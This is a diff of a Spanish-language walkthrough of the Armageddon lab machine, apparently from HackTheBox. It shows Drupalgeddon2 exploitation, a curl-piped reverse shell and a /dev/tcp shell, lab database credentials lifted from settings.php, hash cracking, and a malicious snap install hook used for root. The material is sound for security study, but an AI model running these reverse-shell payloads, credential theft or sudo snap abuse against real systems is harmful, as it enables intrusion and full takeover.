@@ -150,21 +150,27 @@ Drupal es un sistema de gestión de contenidos multipropósito, modular, libre y
 
 ### Drupal < 7.58 Exploitation - Drupalgeddon2 \[RCE] (CVE-2018-7600)
 
-Á travéEn la siguiente  e l
+En la siguiente respuesta de [**Stack Overflow**](https://stackoverflow.com/questions/2887282/how-to-find-version-of-drupal-installed) nos indica una manera sencilla de verificar la versión exacta que se encuentra instalada de `Drupal`.
+
+<figure><img src="../../.gitbook/assets/imagen.png" alt=""><figcaption></figcaption></figure>
+
+Revisaremos si el archivo `CHANGELOG.txt` se encuentra público en la página web. Comprobamos que hemos logrado obtener la versión exacta de `Drupal`, lo cual nos facilita intentar buscar vulnerabilidades para esa versión.
 
 <figure><img src="../../.gitbook/assets/5161_vmware_ygadEHHg7q.png" alt=""><figcaption></figcaption></figure>
 
 Revisaremos posibles vulnerabilidades de la versión de `Drupal 7`. En los resultados obtenidos, nos encontramos de una vulnerabilidad llamada `Drupalgeddon2` la cual nos permite obtener un `Remote Code Execution (RCE)`.
 
+Esta vulnerabilidad está reportada a través del siguiente `CVE-2018-7600`.
+
 <figure><img src="../../.gitbook/assets/imagen (413).png" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2018-7600" %}
 
-{% hint style="info" %}
+{% hint style="danger" %}
 Drupal anterior a 7.58, 8.x anterior a 8.3.9, 8.4.x anterior a 8.4.6 y 8.5.x anterior a 8.5.1 permite a atacantes remotos ejecutar código arbitrario debido a un problema que afecta a múltiples subsistemas con configuraciones de módulos predeterminadas o comunes.
 {% endhint %}
 
-
+Buscando por Internet, nos encontramos con el siguiente repositorio de GitHub en el cual nos proporcionan un PoC a través de un script realizado en `Ruby`.
 
 {% embed url="https://github.com/dreadlocked/Drupalgeddon2" %}
 
@@ -179,7 +185,7 @@ Recibiendo objetos: 100% (257/257), 102.12 KiB | 1.19 MiB/s, listo.
 Resolviendo deltas: 100% (88/88), listo.
 ```
 
-
+Realizaremos la explotación de la vulnerabilidad para lograr obtener una `shell` en el sistema vulnerable. Comprobamos que finalmente obtenemos acceso a la máquina y podemos ejecutar comandos arbitrarios.
 
 ```bash
 ❯ ruby drupalgeddon2.rb http://10.10.10.233
@@ -230,24 +236,26 @@ uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_
        valid_lft forever preferred_lft forever
 ```
 
+Dado que nos encontramos en la shell que nos proporciona el `script`, trataremos de obtener una consola `bash`. Para ello, el método que realizaremos es realizar una petición con `cURL` a nuestro script en `Bash` para lograr obtener la Reverse Shell.
 
+Verificamos que el binario de `cURL` se encuentra instalado en el equipo objetivo.
 
 ```bash
 armageddon.htb>> which curl
 /usr/bin/curl
 ```
 
-
+Desde otra terminal nos pondremos en escucha con `nc` para recibir la Reverse Shell.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+En nuestro equipo loca, deberemos de disponer del siguiente script en `Bash` que es el que utilizaremos para obtener la Reverse Shell. El script lo compartiremos mediante un servidor web.
 
 ```bash
-❯ catnp shell.sh
+❯ cat shell.sh
 #!/bin/bash
 
 /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'
@@ -255,13 +263,13 @@ listening on [any] 443 ...
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Realizaremos desde el equipo víctima la petición con `cURL` al script que estamos compartiendo para que sea ejecutado a través de una `bash`.
 
 ```bash
 armageddon.htb>> curl http://10.10.16.3/shell.sh|bash
 ```
 
-
+Verificamos que logramos obtener acceso al sistema correctamente. El problema es que el usuario actual que disponemos `apache`, no tiene una shell como `sh` o `bash`, por lo tanto la consola que disponemos es bastante limitada.
 
 ```bash
 ❯ nc -nlvp 443
@@ -273,76 +281,15 @@ echo $SHELL
 /sbin/nologin
 ```
 
-
-
 ## Initial Access
 
 ### Information Leakage
 
-```bash
-bash-4.2$ ls -la
-ls -la
-total 288
-drwxr-xr-x.  9 apache apache   4096 Feb 19 01:58 .
-drwxr-xr-x.  4 root   root       33 Dec  3  2020 ..
--rw-r--r--.  1 apache apache    317 Jun 21  2017 .editorconfig
--rw-r--r--.  1 apache apache    174 Jun 21  2017 .gitignore
--rw-r--r--.  1 apache apache   6112 Jun 21  2017 .htaccess
--rw-r--r--.  1 apache apache 111613 Jun 21  2017 CHANGELOG.txt
--rw-r--r--.  1 apache apache   1481 Jun 21  2017 COPYRIGHT.txt
--rw-r--r--.  1 apache apache   1717 Jun 21  2017 INSTALL.mysql.txt
--rw-r--r--.  1 apache apache   1874 Jun 21  2017 INSTALL.pgsql.txt
--rw-r--r--.  1 apache apache   1298 Jun 21  2017 INSTALL.sqlite.txt
--rw-r--r--.  1 apache apache  17995 Jun 21  2017 INSTALL.txt
--rw-r--r--.  1 apache apache  18092 Nov 16  2016 LICENSE.txt
--rw-r--r--.  1 apache apache   8710 Jun 21  2017 MAINTAINERS.txt
--rw-r--r--.  1 apache apache   5382 Jun 21  2017 README.txt
--rw-r--r--.  1 apache apache  10123 Jun 21  2017 UPGRADE.txt
--rw-r--r--.  1 apache apache   6604 Jun 21  2017 authorize.php
--rw-r--r--.  1 apache apache    720 Jun 21  2017 cron.php
-drwxr-xr-x.  4 apache apache   4096 Jun 21  2017 includes
--rw-r--r--.  1 apache apache    529 Jun 21  2017 index.php
--rw-r--r--.  1 apache apache    703 Jun 21  2017 install.php
-drwxr-xr-x.  4 apache apache   4096 Dec  4  2020 misc
-drwxr-xr-x. 42 apache apache   4096 Jun 21  2017 modules
-drwxr-xr-x.  5 apache apache     70 Jun 21  2017 profiles
--rw-r--r--.  1 apache apache   2189 Jun 21  2017 robots.txt
-drwxr-xr-x.  2 apache apache    261 Jun 21  2017 scripts
--rw-r--r--.  1 apache apache     75 Feb 19 02:01 shell.php
-drwxr-xr-x.  4 apache apache     75 Jun 21  2017 sites
-```
-
-
-
-
+Enumeraremos el directorio `/var/www/html/sites/default` en el cual nos encontraremos con un archivo de configuración `settings.php` el cual contiene las credenciales de acceso al `MySQL` de la base de datos que está utilizando `Drupal`.
 
 ```bash
-bash-4.2$ cd sites
-cd sites
-bash-4.2$ ls -la
-ls -la
-total 12
-drwxr-xr-x. 4 apache apache   75 Jun 21  2017 .
-drwxr-xr-x. 9 apache apache 4096 Feb 19 01:58 ..
--rw-r--r--. 1 apache apache  904 Jun 21  2017 README.txt
-drwxr-xr-x. 5 apache apache   52 Jun 21  2017 all
-dr-xr-xr-x. 3 apache apache   67 Dec  3  2020 default
--rw-r--r--. 1 apache apache 2365 Jun 21  2017 example.sites.php
-bash-4.2$ cd default
-cd default
-bash-4.2$ ls -l 
-ls -l
-total 56
--rw-r--r--. 1 apache apache 26250 Jun 21  2017 default.settings.php
-drwxrwxr-x. 3 apache apache    37 Dec  3  2020 files
--r--r--r--. 1 apache apache 26565 Dec  3  2020 settings.php
-```
-
-
-
-
-
-```bash
+bash-4.2$ pwd
+/var/www/html/sites/default
 bash-4.2$ cat settings.php
 <?php
 
@@ -375,9 +322,11 @@ $databases = array (
 );
 ```
 
-
-
 ### SQL Enumeration
+
+Dado que no disponemos de una `bash` para poder acceder al `MySQL` y realizar las consultas, haremos la ejecución del comando en la misma sintaxis del comando.
+
+A continuación, revisaremos nos conectaremos con el usuario `drupaluser` a la base de datos `drupal` para enumerar las tablas presentes. En el resultado obtenido, verificamos que entre todas las tablas que se nos muestra, aparece la tabla `users` que quizás contenga credenciales.
 
 ```bash
 bash-4.2$ mysql -h localhost -e "show tables;" -u drupaluser -pCQHEy@9M*m23gBVj drupal
@@ -387,9 +336,7 @@ users
 ...[snip]...
 ```
 
-
-
-
+Realizaremos una consulta para obtener todos los valores presentes en la tabla `users`. Comprobamos que hemos obtenido las credenciales en formato hash del usuario `brucetherealadmin`.
 
 ```bash
 bash-4.2$ mysql -h localhost -e "SELECT * FROM users;" -u drupaluser -pCQHEy@9M*m23gBVj drupal
@@ -398,7 +345,7 @@ uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	
 1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
 ```
 
-
+Intentaremos crackear el hash a través de `hashcat`. Verificamos que finalmente, logramos obtener las credenciales en texto plano del usuario mencionado.
 
 ```bash
 ❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
@@ -416,20 +363,32 @@ The following mode was auto-detected as the only one matching your input hash:
 $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
 ```
 
+Revisando los usuarios que disponían de `bash` en el equipo, nos encontramos al usuario encontrado en la base de datos de `drupal`. Con lo cual, quizás podamos iniciar sesión con ese usuario.
 
+```bash
+bash-4.2$ cat /etc/passwd | grep bash
+root:x:0:0:root:/root:/bin/bash
+brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash
+```
+
+Verificamos si podemos acceder al `SSH` del equipo con las credenciales del usuario `brucetherealadmin`. Comprobamos el acceso y de la flag **user.txt**.
 
 ```bash
 ❯ sshpass -p booboo ssh brucetherealadmin@10.10.10.233
 Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
 [brucetherealadmin@armageddon ~]$ cat user.txt 
-c13d01dd41747f70f4d80c5c2ab97aaf
+c13d01dd41***********************
 ```
 
 ## Privilege Escalation
 
 ### Abusing sudoers privilege (snap)
 
+Revisando de si el usuario actual disponía de algún permiso de `sudoers`, nos encontramos que podía ejecutar como `sudo` el binario de `snap` para instalar paquetes.
 
+{% hint style="info" %}
+Un Ubuntu Snap paquete, o simplemente Snap es un formato de distribución similar a AppImage en el que se pretende que sea un "paquete instalable universal" para desplegar software en sistemas Linux
+{% endhint %}
 
 ```bash
 [brucetherealadmin@armageddon ~]$ sudo -l
@@ -442,7 +401,7 @@ User brucetherealadmin may run the following commands on armageddon:
     (root) NOPASSWD: /usr/bin/snap install *
 ```
 
-
+A través de la herramienta de [searchbins](https://github.com/r1vs3c/searchbins), realizaremos una consulta para verificar la manera de abusar de este binario que podemos ejecutar como `sudo` para lograr acceso como `root`.
 
 ````bash
 ❯ searchbins -b snap -f sudo
@@ -466,7 +425,11 @@ fpm -n xxxx -s dir -t snap -a all meta
 	| sudo snap install xxxx_1.0_all.snap --dangerous --devmode
 ````
 
+Primero, definimos el comando que queremos ejecutar al instalar el paquete Snap. En este caso, usamos `COMMAND=id` para comprobar si la ejecución se realiza con privilegios elevados. Luego, creamos un directorio temporal con `mktemp -d` y nos movemos a él para evitar conflictos con otros archivos.
 
+Dentro de este directorio, generamos la estructura necesaria para el paquete Snap con `mkdir -p meta/hooks`, ya que Snap permite ejecutar scripts en ciertas etapas de la instalación mediante estos hooks. Luego, creamos el script malicioso con `printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install`, donde definimos que el script se ejecutará con `sh`, insertamos el comando `id` y agregamos `false` al final para evitar que Snap elimine el paquete después de ejecutarlo.
+
+Una vez creado el script, le damos permisos de ejecución con `chmod +x meta/hooks/install` para asegurarnos de que pueda correr sin restricciones. Finalmente, usamos `fpm` para empaquetar todo en un archivo Snap ejecutable con `fpm -n xxxx -s dir -t snap -a all meta`. Esto genera el paquete `xxxx_1.0_all.snap`, que podremos instalar con privilegios de root para comprobar si tenemos acceso al sistema con permisos elevados.
 
 ```bash
 ❯ COMMAND=id
@@ -482,7 +445,7 @@ drwxrwxr-x kali kali  60 B  Wed Feb 19 10:33:58 2025  meta
 .rw-r--r-- kali kali 4.0 KB Wed Feb 19 10:34:11 2025  xxxx_1.0_all.snap
 ```
 
-
+Después de generar el paquete Snap malicioso, lo transferimos a la máquina objetivo utilizando `scp`. Este comando permite copiar archivos de manera segura entre sistemas a través de SSH.
 
 ```bash
 ❯ scp xxxx_1.0_all.snap brucetherealadmin@10.10.10.233:/tmp/
@@ -490,7 +453,7 @@ brucetherealadmin@10.10.10.233's password:
 xxxx_1.0_all.snap                     100% 4096    42.2KB/s   00:00 
 ```
 
-
+En el equipo víctima, verificaremos que el archivo se ha transferido correctamente.
 
 ```bash
 [brucetherealadmin@armageddon tmp]$ ls -l
@@ -498,7 +461,7 @@ total 4
 -rw-r--r--. 1 brucetherealadmin brucetherealadmin 4096 feb 19 02:12 xxxx_1.0_all.snap
 ```
 
-
+Si el comando muestra el `uid=0(root) gid=0(root)`, significa que el hook del paquete Snap se ejecutó como `root`. Esto confirma que tenemos la capacidad de ejecutar comandos con privilegios elevados.
 
 ```bash
 [brucetherealadmin@armageddon tmp]$ sudo snap install xxxx_1.0_all.snap --dangerous --devmode
@@ -506,7 +469,11 @@ error: cannot perform the following tasks:
 - Run install hook of "xxxx" snap if present (run hook "install": uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0)
 ```
 
+En este caso, modificamos el comando que se ejecutará en el hook de instalación del paquete Snap para que establezca una reverse shell hacia nuestra máquina atacante en la IP `10.10.16.3` y el puerto `443`.
 
+El procedimiento sigue siendo el mismo: creamos la estructura del paquete, insertamos el script en `meta/hooks/install`, le damos permisos de ejecución y generamos el paquete con `fpm`.
+
+Transferiremos este nuevo archivo Snap malicioso al equipo víctima.
 
 ```bash
 ❯ COMMAND="/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/443 0>&1'"
@@ -521,21 +488,21 @@ brucetherealadmin@10.10.10.233's password:
 xx_1.0_all.snap                                                              100% 4096    40.6KB/s   00:00 
 ```
 
-
+Desde una terminal nueva, nos pondremos en escucha con `nc` para recibir la conexión.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos el Snap malicioso como `sudo`, si todo funciona bien deberíamos recibir una Reverse Shell.
 
 ```bash
 [brucetherealadmin@armageddon tmp]$ sudo snap install xx_1.0_all.snap --dangerous --devmode
 Run install hook of "xx" snap if present
 ```
 
-
+Verificamos que finalmente hemos logrado obtener acceso como `root` y podemos comprobar la flag **root.txt**.
 
 ```bash
 ❯ nc -nlvp 443
@@ -548,5 +515,5 @@ whoami
 root
 bash-4.3# cat /root/root.txt
 cat /root/root.txt
-861ec4fc42c73846d37bad054b955623
+861ec4fc42c**********************
 ```
